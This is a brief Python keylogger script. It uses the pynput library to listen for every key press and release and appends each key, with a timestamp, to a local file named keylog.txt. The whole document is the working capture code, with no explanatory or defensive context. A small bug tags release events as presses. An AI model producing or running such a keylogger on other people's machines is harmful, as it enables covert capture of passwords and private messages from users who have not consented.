from pynput.keyboard import Key, Listener
import logging
 
 
def on_press(key):
    logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format="%(asctime)s;%(message)s;press")
    logging.info(str(key))

def on_release(key):
    logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format="%(asctime)s;%(message)s;release")
    logging.info(str(key))
 
with Listener(on_press=on_press, on_release=on_release) as listener :
    listener.join()